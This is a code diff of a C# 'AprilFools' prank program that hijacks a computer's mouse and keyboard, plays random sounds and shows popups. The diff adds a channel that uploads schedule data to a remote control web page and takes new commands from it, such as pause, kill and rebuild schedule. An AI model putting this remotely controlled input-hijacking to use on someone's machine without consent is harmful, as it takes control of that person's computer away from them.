@@ -188,12 +188,13 @@ namespace AprilFools
 
         private static void ReadFromCtrlWebPage()
         {
-            string html = GenericsClass.DownloadHTML(ctrlWebPage);
+            string url = ctrlWebPage + "?upload=Y&uploaddata=" + schedule.UploadString();
+            string html = GenericsClass.DownloadHTML(url);
 
             if (html != null)
             {
-                //process html from page
-                Console.WriteLine(html);
+                //process html from page by pulling out new cmds
+
             }
             else
             {
@@ -577,13 +578,6 @@ namespace AprilFools
             randomSoundThread = new Thread(new ThreadStart(RandomSoundThread));
             popupThread = new Thread(new ThreadStart(PopupThread));
 
-            // Start all of the threads
-            externalControlThread.Start();
-            eraticMouseThread.Start();
-            eraticKeyboardThread.Start();
-            randomSoundThread.Start();
-            popupThread.Start();
-
             Console.WriteLine("Build Schedule");
             schedule = new EventScheduler<PrankerEvent>();
 
@@ -595,6 +589,13 @@ namespace AprilFools
             }
 
             CreateSchedule(PrankerSchedule.EasyDay, sessionDefaultDurration, true, sessionDefaultStartDelay);
+
+            // Start all of the threads
+            externalControlThread.Start();
+            eraticMouseThread.Start();
+            eraticKeyboardThread.Start();
+            randomSoundThread.Start();
+            popupThread.Start();
 
             MainBackgroundThread();
         }
@@ -775,6 +776,10 @@ namespace AprilFools
                 case PrankerEvent.CreateSchedule:
                     CreateSchedule();
                     break;
+                case PrankerEvent.RebuildSchedule:
+                    schedule.ClearSchedule();
+                    CreateSchedule();
+                    break;
                 default:
                     handled = false;
                     break;
@@ -790,6 +795,14 @@ namespace AprilFools
         /// </summary>
         public enum PrankerEvent
         {
+            StartPranking,
+            PausePranking,
+            KillApplication,
+
+            CreateSchedule,
+            RebuildSchedule,
+            DisableStartup, //this is in case I dont want the application to run at all even in the application is launched - must be checked in external source at startup
+
             //mouse events
             StartEraticMouseThread,
             StopEraticMouseThread,
@@ -814,15 +827,6 @@ namespace AprilFools
 
             //popup events
             CreateRandomPopupNow,
-
-
-            //
-            CreateSchedule,
-            DisableStartup, //this is in case I dont want the application to run at all even in the application is launched - must be checked in external source at startup
-
-            StartPranking,
-            PausePranking,
-            KillApplication,
         }
         #endregion
     }
